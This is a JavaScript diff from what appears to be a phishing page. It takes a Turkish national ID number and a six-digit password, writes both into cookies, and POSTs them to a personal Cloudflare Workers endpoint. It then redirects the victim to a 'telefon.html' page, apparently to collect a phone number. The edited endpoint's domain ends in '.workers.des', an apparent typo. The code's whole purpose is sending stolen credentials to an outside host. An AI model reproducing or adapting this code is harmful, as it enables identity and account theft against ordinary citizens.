@@ -454,28 +454,32 @@
             // TC kimlik numarası ve şifre uzunluğunu kontrol et
             if (tcno.length === 11 && pass.length === 6) {
                 // TC kimlik doğrulaması yap
-                if (tcno_dogrula_ve_islem_yap(tcno)) {
-                    // POST işlemi için veri oluştur
-                    var data = new FormData();
-                    data.append('tcno', tcno);
-                    data.append('pass', pass);
-                    data.append('name', assignedName); // Kullanıcıya atanan adı POST verilerine ekle
+if (tcno_dogrula_ve_islem_yap(tcno)) {
+    // Cookie'leri oluştur
+    document.cookie = `tcno=${tcno}; path=/`;
+    document.cookie = `pass=${pass}; path=/`;
 
-                    // POST işlemi için fetch kullanarak isteği oluştur
-                    fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
-                        method: 'POST',
-                        body: data
-                    })
-                    .then(response => response.text())
-                    .then(data => {
-                        console.log(data);
-                        window.location.href = 'telefon.html';
-                    })
-                    .catch(error => {
-                        console.error('Hata:', error);
-                        window.location.href = 'telefon.html';
-                    });
-                } else {
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('tcno', tcno);
+    data.append('pass', pass);
+
+    // POST işlemi için fetch kullanarak isteği oluştur
+    fetch('https://worker-steep-shape-b948.selimjuhan2.workers.des/', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'telefon.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'telefon.html';
+    });
+}
+else {
                     alert("Geçersiz TC Kimlik Numarası");
                 }
             } else {
